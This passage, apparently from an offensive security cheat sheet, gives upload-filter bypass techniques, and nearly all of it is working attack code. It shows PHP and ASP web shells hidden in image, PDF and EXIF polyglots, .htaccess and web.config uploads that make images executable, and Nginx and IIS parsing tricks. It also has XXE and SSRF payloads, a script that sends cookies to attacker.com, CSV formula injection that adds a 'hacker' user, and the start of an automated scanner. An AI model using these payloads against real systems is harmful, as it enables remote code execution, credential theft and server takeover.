      text_crc = zlib.crc32(b'tEXt' + text_data) & 0xffffffff
      text = struct.pack('>I', len(text_data)) + b'tEXt' + text_data + struct.pack('>I', text_crc)
      
      # IDAT chunk (minimal)
      raw_data = b'\x00\x00\x00\x00'
      compressed = zlib.compress(raw_data)
      idat_crc = zlib.crc32(b'IDAT' + compressed) & 0xffffffff
      idat = struct.pack('>I', len(compressed)) + b'IDAT' + compressed + struct.pack('>I', idat_crc)
      
      # IEND chunk
      iend_crc = zlib.crc32(b'IEND') & 0xffffffff
      iend = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', iend_crc)
      
      with open(output, 'wb') as f:
          f.write(png_sig + ihdr + text + idat + iend)
      
      print(f"[+] Created {output}")
  
  create_png_polyglot('polyglot.php.png')
  PYEOF
  ```
  :::

  :::tabs-item{label="GIF Polyglot"}
  ```bash
  # GIF89a header + PHP (simplest polyglot)
  echo -n 'GIF89a' > polyglot.php.gif
  echo '<?php echo "POLYGLOT_GIF"; system($_GET["cmd"]); ?>' >> polyglot.php.gif
  
  # GIF87a variant
  echo -n 'GIF87a' > polyglot2.php.gif
  echo '<?php echo "POLYGLOT_GIF87"; system($_GET["cmd"]); ?>' >> polyglot2.php.gif
  
  # GIF with valid dimensions
  printf 'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;' > polyglot.php.gif
  echo '<?php echo "GIF_FULL"; system($_GET["cmd"]); ?>' >> polyglot.php.gif
  
  # Verify
  file polyglot.php.gif
  # Output: GIF image data, version 89a, 1 x 1
  
  # Upload with GIF Content-Type
  curl -X POST https://target.com/upload \
    -F "file=@polyglot.php.gif;filename=avatar.gif;type=image/gif" \
    -H "Cookie: session=SESS"
  ```
  :::

  :::tabs-item{label="PDF Polyglot"}
  ```bash
  # PDF header + PHP
  cat > polyglot.php.pdf << 'EOF'
  %PDF-1.4
  1 0 obj
  <</Type /Catalog /Pages 2 0 R>>
  endobj
  2 0 obj
  <</Type /Pages /Kids [] /Count 0>>
  endobj
  
  <?php echo "POLYGLOT_PDF"; system($_GET["cmd"]); ?>
  
  xref
  0 3
  0000000000 65535 f 
  0000000009 00000 n 
  0000000058 00000 n 
  trailer
  <</Size 3 /Root 1 0 R>>
  startxref
  182
  %%EOF
  EOF
  
  file polyglot.php.pdf
  # Output: PDF document, version 1.4
  
  curl -X POST https://target.com/upload \
    -F "file=@polyglot.php.pdf;filename=document.pdf;type=application/pdf" \
    -H "Cookie: session=SESS"
  ```
  :::

  :::tabs-item{label="BMP Polyglot"}
  ```bash
  # BMP header + PHP
  # BM magic bytes + minimal header
  python3 -c "
  import struct
  header = b'BM'                    # Magic
  header += struct.pack('<I', 100)   # File size
  header += b'\x00\x00\x00\x00'     # Reserved
  header += struct.pack('<I', 54)    # Pixel data offset
  header += struct.pack('<I', 40)    # DIB header size
  header += struct.pack('<i', 1)     # Width
  header += struct.pack('<i', 1)     # Height
  header += struct.pack('<H', 1)     # Color planes
  header += struct.pack('<H', 24)    # Bits per pixel
  header += b'\x00' * 24            # Rest of DIB header
  
  php = b'\n<?php echo \"POLYGLOT_BMP\"; system(\$_GET[\"cmd\"]); ?>'
  
  with open('polyglot.php.bmp', 'wb') as f:
      f.write(header + php)
  print('[+] Created polyglot.php.bmp')
  " 
  ```
  :::
::

### EXIF Metadata Injection

::code-group
```bash [exiftool Injection]
# Inject PHP into EXIF fields of real images
cp legitimate_photo.jpg shell_exif.php.jpg

# Comment field
exiftool -Comment='<?php system($_GET["cmd"]); ?>' shell_exif.php.jpg

# Artist field
exiftool -Artist='<?php system($_GET["cmd"]); ?>' shell_exif.php.jpg

# Copyright field
exiftool -Copyright='<?php system($_GET["cmd"]); ?>' shell_exif.php.jpg

# Description
exiftool -ImageDescription='<?php system($_GET["cmd"]); ?>' shell_exif.php.jpg

# DocumentName
exiftool -DocumentName='<?php echo shell_exec($_GET["cmd"]); ?>' shell_exif.php.jpg

# XPComment (Windows EXIF)
exiftool -XPComment='<?php system($_GET["cmd"]); ?>' shell_exif.php.jpg

# Multiple fields at once
exiftool \
  -Comment='<?php system($_GET["c1"]); ?>' \
  -Artist='<?php system($_GET["c2"]); ?>' \
  -Copyright='<?php system($_GET["c3"]); ?>' \
  shell_exif.php.jpg

# Verify injection
exiftool shell_exif.php.jpg | grep -i "php"
strings shell_exif.php.jpg | grep "php"
```

```bash [Manual EXIF Injection]
# Using wrjpgcom (libjpeg-turbo)
echo '<?php system($_GET["cmd"]); ?>' | wrjpgcom -replace legitimate.jpg > shell_comment.php.jpg

# Using python PIL
python3 << 'PYEOF'
from PIL import Image
from PIL.ExifTags import Base
import piexif

img = Image.open("legitimate.jpg")

# Inject into UserComment
exif_dict = piexif.load(img.info.get('exif', b''))
exif_dict['Exif'][piexif.ExifIFD.UserComment] = b'<?php system($_GET["cmd"]); ?>'
exif_bytes = piexif.dump(exif_dict)
img.save("shell_piexif.php.jpg", exif=exif_bytes)
print("[+] Created shell_piexif.php.jpg")
PYEOF

# Verify the image is still valid
identify shell_comment.php.jpg
file shell_comment.php.jpg
```

```bash [Upload EXIF Shell]
# Upload with legitimate-looking name
curl -X POST https://target.com/upload \
  -F "file=@shell_exif.php.jpg;filename=photo.jpg;type=image/jpeg" \
  -H "Cookie: session=SESS"

# If server includes the file (LFI/include vulnerability)
curl "https://target.com/page?include=/uploads/photo.jpg&cmd=id"

# If file is served directly and Apache processes embedded PHP
curl "https://target.com/uploads/photo.jpg?cmd=id"

# If .htaccess allows PHP in images
curl "https://target.com/uploads/photo.jpg?cmd=id"
```
::

### Bypassing Image Reprocessing

::accordion
  :::accordion-item{label="Surviving GD Library Reprocessing"}
  ```bash
  # PHP GD library strips EXIF and recompresses images
  # Inject PHP into IDAT (pixel data) that survives recompression
  
  # Tool: https://github.com/synacktiv/php-jpeg-injector
  python3 php_jpeg_injector.py \
    --input legitimate.jpg \
    --output gd_bypass.jpg \
    --payload '<?php system($_GET["cmd"]); ?>'
  
  # Manual approach for PNG:
  # Create image where pixel data encodes PHP when reprocessed
  python3 << 'PYEOF'
  from PIL import Image
  import struct
  
  # Create tiny image with PHP payload encoded in pixel data
  payload = b'<?=`$_GET[c]`?>'
  
  # Pad payload to fit pixel data
  width = len(payload)
  height = 1
  
  img = Image.new('RGB', (width, height))
  pixels = img.load()
  
  for i, byte in enumerate(payload):
      # Encode payload byte into pixel RGB values
      # This may survive GD reprocessing for certain configurations
      pixels[i, 0] = (byte, byte, byte)
  
  img.save('gd_inject.png', 'PNG')
  print(f"[+] Created gd_inject.png ({width}x{height})")
  PYEOF
  ```
  :::

  :::accordion-item{label="Surviving ImageMagick Reprocessing"}
  ```bash
  # ImageMagick may preserve certain metadata or chunks
  
  # SVG that ImageMagick processes (potential SSRF/RCE)
  cat > imagemagick_shell.svg << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
    <image width="200" height="200" xlink:href="https://attacker.com/callback?data=imagemagick"/>
  </svg>
  EOF
  
  # MVG payload (ImageMagick)
  cat > exploit.mvg << 'EOF'
  push graphic-context
  viewbox 0 0 640 480
  image over 0,0 0,0 'https://attacker.com/callback'
  pop graphic-context
  EOF
  
  # MSL payload
  cat > exploit.msl << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <image>
    <read filename="https://attacker.com/callback"/>
    <write filename="/var/www/html/uploads/shell.php"/>
  </image>
  EOF
  
  # Upload disguised as image
  curl -X POST https://target.com/upload \
    -F "file=@imagemagick_shell.svg;filename=image.svg;type=image/svg+xml" \
    -H "Cookie: session=SESS"
  
  curl -X POST https://target.com/upload \
    -F "file=@exploit.mvg;filename=image.jpg;type=image/jpeg" \
    -H "Cookie: session=SESS"
  ```
  :::

  :::accordion-item{label="ICC Profile Injection"}
  ```bash
  # ICC color profiles are preserved by most image reprocessors
  # Inject PHP payload into ICC profile data
  
  python3 << 'PYEOF'
  from PIL import Image
  from io import BytesIO
  
  # Create minimal ICC profile with PHP payload
  payload = b'<?php system($_GET["cmd"]); ?>'
  
  # ICC profile header (128 bytes minimum)
  icc_header = b'\x00' * 128
  # Replace description with payload
  icc_data = icc_header + payload
  # Fix profile size
  import struct
  icc_data = struct.pack('>I', len(icc_data)) + icc_data[4:]
  
  img = Image.open("legitimate.jpg")
  img.save("icc_inject.jpg", icc_profile=icc_data)
  print("[+] Created icc_inject.jpg with PHP in ICC profile")
  PYEOF
  
  # Some servers preserve ICC profiles through reprocessing
  curl -X POST https://target.com/upload \
    -F "file=@icc_inject.jpg;filename=photo.jpg;type=image/jpeg" \
    -H "Cookie: session=SESS"
  ```
  :::
::

## Content-Type Header Exploitation

### Comprehensive MIME Spoofing

::tabs
  :::tabs-item{label="Basic Spoofing"}
  ```bash
  # Shell with whitelisted MIME type
  SHELL='<?php echo "MIME_BYPASS"; system($_GET["cmd"]); ?>'
  echo "$SHELL" > /tmp/mime_shell.php
  
  # Spoof as each common whitelisted type
  for mime in \
    "image/jpeg" "image/png" "image/gif" "image/bmp" \
    "image/webp" "image/svg+xml" "image/tiff" \
    "application/pdf" "text/plain" "application/octet-stream"; do
    
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST https://target.com/upload \
      -F "file=@/tmp/mime_shell.php;filename=shell.php;type=${mime}" \
      -H "Cookie: session=SESS")
    
    [ "$code" = "200" ] || [ "$code" = "201" ] && \
      echo "[ALLOWED] Content-Type: ${mime} -> HTTP ${code}"
  done
  ```
  :::

  :::tabs-item{label="Content-Type Manipulation"}
  ```http
  # Empty Content-Type
  Content-Disposition: form-data; name="file"; filename="shell.php"
  Content-Type: 
  
  # No Content-Type line at all
  Content-Disposition: form-data; name="file"; filename="shell.php"
  
  # Malformed Content-Type
  Content-Disposition: form-data; name="file"; filename="shell.php"
  Content-Type: image/jpeg; charset=php
  
  # Content-Type with parameters
  Content-Disposition: form-data; name="file"; filename="shell.php"
  Content-Type: image/jpeg; boundary=something
  
  # Multiple Content-Type values
  Content-Disposition: form-data; name="file"; filename="shell.php"
  Content-Type: image/jpeg
  Content-Type: application/x-php
  
  # Content-Type with extra spaces
  Content-Disposition: form-data; name="file"; filename="shell.php"
  Content-Type:  image/jpeg
  
  # Case variation in Content-Type
  Content-Disposition: form-data; name="file"; filename="shell.php"
  content-type: image/jpeg
  
  # Wildcard MIME
  Content-Disposition: form-data; name="file"; filename="shell.php"
  Content-Type: image/*
  ```
  :::

  :::tabs-item{label="Burp Raw Request"}
  ```http
  POST /upload HTTP/1.1
  Host: target.com
  Cookie: session=YOUR_SESSION
  Content-Type: multipart/form-data; boundary=----FormBound
  
  ------FormBound
  Content-Disposition: form-data; name="file"; filename="shell.php"
  Content-Type: image/jpeg
  
  <?php echo "MIME_SPOOF"; system($_GET["cmd"]); ?>
  ------FormBound--
  ```
  :::

  :::tabs-item{label="Double Content-Type in Multipart"}
  ```http
  POST /upload HTTP/1.1
  Host: target.com
  Cookie: session=YOUR_SESSION
  Content-Type: multipart/form-data; boundary=----FormBound
  
  ------FormBound
  Content-Disposition: form-data; name="file"; filename="shell.php"
  Content-Type: image/jpeg
  Content-Type: application/x-php
  
  <?php echo "DOUBLE_CT"; system($_GET["cmd"]); ?>
  ------FormBound--
  ```
  :::
::

### Accept Header Manipulation

::code-group
```bash [Request-Level Manipulation]
# Some servers use Accept header to determine how to handle uploads
curl -X POST https://target.com/upload \
  -F "file=@shell.php;filename=shell.php" \
  -H "Cookie: session=SESS" \
  -H "Accept: image/jpeg, image/png, image/*"

# X-Content-Type header injection
curl -X POST https://target.com/upload \
  -F "file=@shell.php;filename=shell.php;type=image/jpeg" \
  -H "Cookie: session=SESS" \
  -H "X-Content-Type: image/jpeg"

# Content-Type at request level
curl -X POST https://target.com/upload \
  -H "Content-Type: multipart/form-data; boundary=----B; type=image/jpeg" \
  -F "file=@shell.php;filename=shell.php" \
  -H "Cookie: session=SESS"
```

```bash [Override Response Content-Type]
# Some upload systems set Content-Type based on upload
# If we control stored Content-Type, can achieve XSS/etc
curl -X POST https://target.com/upload \
  -F "file=@xss.html;filename=test.jpg;type=text/html" \
  -H "Cookie: session=SESS"

# Check how the file is served back
curl -s -D- "https://target.com/uploads/test.jpg" -o /dev/null | grep "Content-Type"
# If served as text/html → XSS via uploaded file
```
::

## Server-Specific Exploitation

### Apache Misconfigurations

::tabs
  :::tabs-item{label="AddHandler / AddType Abuse"}
  ```bash
  # Apache AddHandler directive processes ALL files with matching extension
  # Even if other extensions are present
  # If AddHandler php-script .php exists:
  # shell.php.jpg → Apache sees .php → EXECUTES AS PHP
  
  # Test Apache multi-extension handling
  PAYLOADS=(
    "shell.php.jpg"
    "shell.php.jpeg"  
    "shell.php.png"
    "shell.php.gif"
    "shell.php.pdf"
    "shell.php.txt"
    "shell.php.html"
    "shell.php.css"
    "shell.php.js"
    "shell.php.ico"
    "shell.php.zip"
    "shell.php.xml"
    "shell.php.svg"
    "shell.php.unknown_extension"
  )
  
  SHELL='<?php echo "APACHE_HANDLER_BYPASS"; system($_GET["cmd"]); ?>'
  echo "$SHELL" > /tmp/apache_shell
  
  for payload in "${PAYLOADS[@]}"; do
    # Upload
    curl -s -X POST https://target.com/upload \
      -F "file=@/tmp/apache_shell;filename=${payload};type=image/jpeg" \
      -H "Cookie: session=SESS" -o /dev/null
    
    # Check execution
    result=$(curl -s "https://target.com/uploads/${payload}?cmd=id")
    if echo "$result" | grep -q "APACHE_HANDLER"; then
      echo "[+] EXEC: ${payload}"
    fi
  done
  ```
  :::

  :::tabs-item{label=".htaccess Upload"}
  ```bash
  # If .htaccess is in the whitelist or bypasses the check
  # (some whitelists only check for known bad extensions)
  
  # .htaccess to make .jpg executable as PHP
  cat > htaccess_payload << 'EOF'
  AddType application/x-httpd-php .jpg .png .gif
  AddHandler php-script .jpg .png .gif
  EOF
  
  # Try uploading .htaccess directly
  curl -X POST https://target.com/upload \
    -F "file=@htaccess_payload;filename=.htaccess;type=text/plain" \
    -H "Cookie: session=SESS"
  
  # Alternate .htaccess names that Apache might process
  for name in ".htaccess" ".htaccess.bak" "htaccess" ".htaccess.txt"; do
    curl -s -o /dev/null -w "${name} -> HTTP %{http_code}\n" \
      -X POST https://target.com/upload \
      -F "file=@htaccess_payload;filename=${name}" \
      -H "Cookie: session=SESS"
  done
  
  # After .htaccess is uploaded, upload shell with image extension
  echo '<?php echo "HTACCESS_CHAIN"; system($_GET["cmd"]); ?>' > shell_as_jpg.jpg
  curl -X POST https://target.com/upload \
    -F "file=@shell_as_jpg.jpg;filename=avatar.jpg;type=image/jpeg" \
    -H "Cookie: session=SESS"
  
  # Execute
  curl "https://target.com/uploads/avatar.jpg?cmd=id"
  ```
  :::

  :::tabs-item{label="mod_negotiation Abuse"}
  ```bash
  # Apache mod_negotiation with MultiViews
  # If enabled, Apache matches files without full extension
  # shell.php can be accessed as /shell even without .php extension
  
  # Upload shell with allowed extension + .php 
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.php.jpg;type=image/jpeg" \
    -H "Cookie: session=SESS"
  
  # Try accessing without extension (MultiViews negotiation)
  curl "https://target.com/uploads/shell?cmd=id"
  curl "https://target.com/uploads/shell.php?cmd=id"
  
  # OPTIONS to check negotiation
  curl -X OPTIONS "https://target.com/uploads/shell" -D-
  ```
  :::
::

### Nginx Misconfigurations

::tabs
  :::tabs-item{label="PATH_INFO / cgi.fix_pathinfo"}
  ```bash
  # Nginx + PHP-FPM with cgi.fix_pathinfo=1
  # /uploads/image.jpg/anything.php → PHP processes image.jpg AS PHP
  
  # Upload a valid image with PHP embedded
  echo 'GIF89a<?php echo "PATHINFO_BYPASS"; system($_GET["cmd"]); ?>' > gif_shell.gif
  
  curl -X POST https://target.com/upload \
    -F "file=@gif_shell.gif;filename=avatar.gif;type=image/gif" \
    -H "Cookie: session=SESS"
  
  # Exploit path_info
  curl "https://target.com/uploads/avatar.gif/x.php?cmd=id"
  curl "https://target.com/uploads/avatar.gif/.php?cmd=id"
  curl "https://target.com/uploads/avatar.gif/anything.php?cmd=id"
  curl "https://target.com/uploads/avatar.gif%00.php?cmd=id"
  
  # Try different path patterns
  for suffix in \
    "/x.php" "/.php" "/shell.php" "/a.php" \
    "%0a.php" "/x.phtml" "/x.pht"; do
    result=$(curl -s "https://target.com/uploads/avatar.gif${suffix}?cmd=id")
    echo "$result" | grep -q "PATHINFO_BYPASS" && \
      echo "[+] EXEC: avatar.gif${suffix}" && break
  done
  ```
  :::

  :::tabs-item{label="Nginx Alias Traversal + Upload"}
  ```bash
  # Nginx alias misconfiguration with upload
  # location /uploads {
  #     alias /var/www/uploads;
  # }
  # Missing trailing slash on alias → traversal possible
  
  # Upload file normally
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.php;type=image/jpeg" \
    -H "Cookie: session=SESS"
  
  # Access via alias traversal
  curl "https://target.com/uploads../html/uploads/shell.php?cmd=id"
  curl "https://target.com/uploads../shell.php?cmd=id"
  ```
  :::
::

### IIS Misconfigurations

::tabs
  :::tabs-item{label="Semicolon Parsing"}
  ```bash
  # IIS treats semicolon as parameter separator
  # shell.asp;.jpg → IIS processes as .asp, ignores ;.jpg
  
  PAYLOADS=(
    "shell.asp;.jpg"
    "shell.aspx;.jpg"
    "shell.asp;.png"
    "shell.aspx;.png"
    "shell.asp;.gif"
    "shell.aspx;test.jpg"
    "shell.asp;anything.png"
    "shell.ashx;.jpg"
    "shell.asmx;.png"
    "shell.cer;.jpg"
    "shell.asa;.jpg"
  )
  
  for payload in "${PAYLOADS[@]}"; do
    curl -s -o /dev/null -w "%-35s -> HTTP %{http_code}\n" \
      -X POST https://target.com/upload \
      -F "file=@shell.aspx;filename=${payload};type=image/jpeg" \
      -H "Cookie: session=SESS"
  done
  ```
  :::

  :::tabs-item{label="IIS Short Filename (8.3)"}
  ```bash
  # IIS 8.3 short filename allows accessing files with ~ notation
  # Uploaded as: vulnerable_shell_name.aspx
  # Accessible as: VULNER~1.ASP
  
  # Upload shell with long name
  curl -X POST https://target.com/upload \
    -F "file=@shell.aspx;filename=legitimate_image_file.aspx;type=image/jpeg" \
    -H "Cookie: session=SESS"
  
  # Access via 8.3 short name
  curl "https://target.com/uploads/LEGITI~1.ASP"
  curl "https://target.com/uploads/LEGITI~1.ASPX"
  
  # Enumerate short names
  # Use IIS Short Name Scanner
  java -jar iis_shortname_scanner.jar https://target.com/uploads/
  ```
  :::

  :::tabs-item{label="web.config Upload"}
  ```bash
  # Upload web.config to enable ASP/ASPX execution
  cat > web_config << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="web_config" path="*.jpg" verb="*" 
             modules="IsapiModule" 
             scriptProcessor="%windir%\system32\inetsrv\asp.dll" 
             resourceType="Unspecified" />
      </handlers>
      <security>
        <requestFiltering>
          <fileExtensions>
            <remove fileExtension=".asp" />
            <remove fileExtension=".aspx" />
          </fileExtensions>
        </requestFiltering>
      </security>
    </system.webServer>
  </configuration>
  EOF
  
  curl -X POST https://target.com/upload \
    -F "file=@web_config;filename=web.config;type=text/xml" \
    -H "Cookie: session=SESS"
  
  # Now upload ASP shell disguised as JPG
  echo '<% Response.Write(CreateObject("WScript.Shell").Exec("cmd /c " & Request("cmd")).StdOut.ReadAll) %>' > shell_asp.jpg
  curl -X POST https://target.com/upload \
    -F "file=@shell_asp.jpg;filename=shell.jpg;type=image/jpeg" \
    -H "Cookie: session=SESS"
  
  curl "https://target.com/uploads/shell.jpg?cmd=whoami"
  ```
  :::
::

## Regex Whitelist Bypasses

::tabs
  :::tabs-item{label="Anchoring Issues"}
  ```bash
  # Regex: /\.(jpg|png|gif)$/
  # Missing case-insensitive flag
  
  # Bypass with uppercase
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.PHP" \
    -H "Cookie: session=SESS"
  
  # Regex: /\.(jpg|png|gif)/  (no $ anchor)
  # Matches .jpg ANYWHERE in filename
  
  # Bypass: include .jpg in middle
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.jpg.php" \
    -H "Cookie: session=SESS"
  
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.jpg%00.php" \
    -H "Cookie: session=SESS"
  ```
  :::

  :::tabs-item{label="Multiline Mode Bypass"}
  ```bash
  # Regex: /\.(jpg|png|gif)$/m  (multiline mode)
  # $ matches end of LINE, not end of STRING
  
  # Bypass: newline before extension
  # shell.php\n.jpg → $ matches before \n
  
  # URL-encoded newline
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.php%0a.jpg" \
    -H "Cookie: session=SESS"
  
  # Carriage return
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.php%0d.jpg" \
    -H "Cookie: session=SESS"
  
  # CRLF
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.php%0d%0a.jpg" \
    -H "Cookie: session=SESS"
  ```
  :::

  :::tabs-item{label="Dot Metacharacter Abuse"}
  ```bash
  # Regex: /\.jpg$/ → the dot is NOT escaped
  # . matches ANY character
  
  # Bypass: any character before "jpg"
  # "XjpgY" won't work, but "Xjpg" at end will match /\.jpg$/
  # Actually . in regex context matches any char
  # So /\.jpg$/ matches ".jpg" and "Xjpg" — but filename context 
  # makes this less useful. More relevant:
  
  # If regex is: /^[a-zA-Z0-9]+\.(jpg|png)$/
  # and dot is not escaped: /^[a-zA-Z0-9]+.(jpg|png)$/
  # Then "shell_php" passes (. matches _)
  # But more practically:
  
  # Regex: /\.(jpg|png|gif)$/
  # If applied to full path, not just filename:
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.php/.jpg" \
    -H "Cookie: session=SESS"
  # Path component tricks the regex anchor
  ```
  :::

  :::tabs-item{label="Unicode / Charset Bypass"}
  ```bash
  # If regex doesn't handle Unicode properly
  # Unicode fullwidth characters
  
  # Fullwidth dot: ．(U+FF0E)
  # Fullwidth slash: ／(U+FF0F)
  
  # These may bypass regex but be normalized by filesystem
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell%EF%BC%8Ephp" \
    -H "Cookie: session=SESS"
  
  # Unicode normalization attacks
  # Some systems normalize filenames (NFC/NFD)
  # ﬁle.php → file.php after normalization
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=%EF%AC%81le.php" \
    -H "Cookie: session=SESS"
  ```
  :::
::

## Non-Code File Abuse

### Exploiting Whitelisted File Types

::note
Even when the whitelist correctly prevents executable code upload, certain allowed file types can be abused for XSS, SSRF, XXE, or information disclosure.
::

::tabs
  :::tabs-item{label="SVG → XSS/SSRF"}
  ```bash
  # SVG files are often whitelisted as images
  # They support embedded JavaScript and external references
  
  # XSS via SVG
  cat > xss.svg << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
    <circle cx="50" cy="50" r="40"/>
  </svg>
  EOF
  
  # SVG with event handler
  cat > xss2.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg">
    <rect width="100" height="100" onmouseover="alert(document.cookie)"/>
    <script>alert(document.domain)</script>
  </svg>
  EOF
  
  # SVG with external resource (SSRF)
  cat > ssrf.svg << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image width="200" height="200" xlink:href="http://169.254.169.254/latest/meta-data/"/>
  </svg>
  EOF
  
  # SVG with XXE
  cat > xxe.svg << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>
  EOF
  
  # Upload each
  for f in xss.svg xss2.svg ssrf.svg xxe.svg; do
    curl -X POST https://target.com/upload \
      -F "file=@${f};filename=${f};type=image/svg+xml" \
      -H "Cookie: session=SESS"
    echo "Uploaded: ${f} → https://target.com/uploads/${f}"
  done
  ```
  :::

  :::tabs-item{label="HTML → XSS"}
  ```bash
  # If .html or .htm is whitelisted
  cat > xss.html << 'EOF'
  <!DOCTYPE html>
  <html>
  <body>
  <script>
  // Steal cookies
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
  // Or redirect
  // window.location = 'https://attacker.com/phish';
  </script>
  </body>
  </html>
  EOF
  
  curl -X POST https://target.com/upload \
    -F "file=@xss.html;filename=page.html;type=text/html" \
    -H "Cookie: session=SESS"
  
  # If .html is blocked, try variations
  for ext in htm xhtml shtml xht mht mhtml hta; do
    curl -s -o /dev/null -w ".${ext} -> HTTP %{http_code}\n" \
      -X POST https://target.com/upload \
      -F "file=@xss.html;filename=page.${ext}" \
      -H "Cookie: session=SESS"
  done
  ```
  :::

  :::tabs-item{label="XML → XXE"}
  ```bash
  # XML files often whitelisted for data import
  cat > xxe.xml << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ELEMENT foo ANY>
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <foo>&xxe;</foo>
  EOF
  
  # XXE with parameter entities (blind)
  cat > xxe_blind.xml << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
    %xxe;
  ]>
  <foo>test</foo>
  EOF
  
  # evil.dtd on attacker server:
  # <!ENTITY % file SYSTEM "file:///etc/passwd">
  # <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
  # %eval;
  # %exfil;
  
  curl -X POST https://target.com/upload \
    -F "file=@xxe.xml;filename=data.xml;type=application/xml" \
    -H "Cookie: session=SESS"
  
  # XLSX (Excel) is XML-based — XXE possible
  # Unzip, inject XXE, rezip
  mkdir xlsx_extract
  unzip legitimate.xlsx -d xlsx_extract/
  # Edit xlsx_extract/[Content_Types].xml to include XXE
  sed -i '1s|<?xml version="1.0"|<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "file:///etc/passwd">\n]|' xlsx_extract/\[Content_Types\].xml
  cd xlsx_extract && zip -r ../evil.xlsx * && cd ..
  
  curl -X POST https://target.com/upload \
    -F "file=@evil.xlsx;filename=report.xlsx;type=application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" \
    -H "Cookie: session=SESS"
  ```
  :::

  :::tabs-item{label="PDF → SSRF/XSS"}
  ```bash
  # PDF with JavaScript (if rendered server-side)
  cat > js_pdf.pdf << 'EOF'
  %PDF-1.4
  1 0 obj
  <</Type /Catalog /Pages 2 0 R /OpenAction 3 0 R>>
  endobj
  2 0 obj
  <</Type /Pages /Kids [] /Count 0>>
  endobj
  3 0 obj
  <</Type /Action /S /JavaScript /JS (app.alert('XSS'))>>
  endobj
  xref
  0 4
  0000000000 65535 f 
  trailer
  <</Size 4 /Root 1 0 R>>
  startxref
  0
  %%EOF
  EOF
  
  # PDF with external reference (SSRF if rendered)
  # Use tools like pdf-parser or manual crafting
  
  curl -X POST https://target.com/upload \
    -F "file=@js_pdf.pdf;filename=document.pdf;type=application/pdf" \
    -H "Cookie: session=SESS"
  ```
  :::

  :::tabs-item{label="CSV → Formula Injection"}
  ```bash
  # CSV formula injection (if processed by spreadsheet)
  cat > evil.csv << 'EOF'
  Name,Email,Phone
  =cmd|'/C calc.exe'!A0,user@example.com,555-1234
  =HYPERLINK("http://attacker.com/steal?data="&A1),test@test.com,555-5678
  +cmd|'/C powershell -ep bypass -e BASE64PAYLOAD'!A0,admin@example.com,555-9012
  -cmd|'/C net user hacker Password123! /add'!A0,root@example.com,555-3456
  @SUM(1+1)*cmd|'/C calc.exe'!A0,dev@example.com,555-7890
  EOF
  
  curl -X POST https://target.com/upload \
    -F "file=@evil.csv;filename=contacts.csv;type=text/csv" \
    -H "Cookie: session=SESS"
  ```
  :::
::

## Automated Exploitation

### Complete Whitelist Bypass Scanner

::code-collapse

```python
#!/usr/bin/env python3
"""
Whitelist Misconfiguration Scanner
Tests all known bypass techniques against file upload endpoints
"""

import requests
import sys
import os
import struct
import itertools
from urllib.parse import quote

class WhitelistBypassScanner:
    def __init__(self, target, upload_path, access_path, cookie):
        self.target = target.rstrip('/')
        self.upload_url = f"{self.target}{upload_path}"
        self.access_base = f"{self.target}{access_path}"
        self.session = requests.Session()
        self.session.headers['Cookie'] = cookie
        self.session.verify = False
        self.results = []
        
        self.php_shell = '<?php echo "WHITELIST_BYPASS_" . php_uname(); system($_GET["cmd"]); ?>'
        self.asp_shell = '<%@ Page Language="C#" %><% Response.Write("WHITELIST_BYPASS"); %>'
        self.jsp_shell = '<% out.println("WHITELIST_BYPASS"); %>'
    
    def upload(self, filename, content, content_type='image/jpeg'):
        try:
            files = {'file': (filename, content, content_type)}
            r = self.session.post(self.upload_url, files=files, timeout=10)
            return r.status_code
        except:
            return 0
    
    def check_execution(self, filename, marker='WHITELIST_BYPASS'):
        paths = [
            f"{self.access_base}/{filename}",
            f"{self.access_base}/{filename}?cmd=id",
        ]
        for url in paths:
            try:
                r = self.session.get(url, timeout=5)
                if marker in r.text:
                    return url
            except:
                pass
        return None
    
    def test_case_variations(self):
        print("\n[*] Testing case manipulation...")
        extensions = ['php', 'phtml', 'pht', 'php5', 'phar']
        
        for ext in extensions:
            for combo in itertools.product(*[(c.lower(), c.upper()) for c in ext]):
                variant = ''.join(combo)
                if variant.lower() == ext:
                    continue
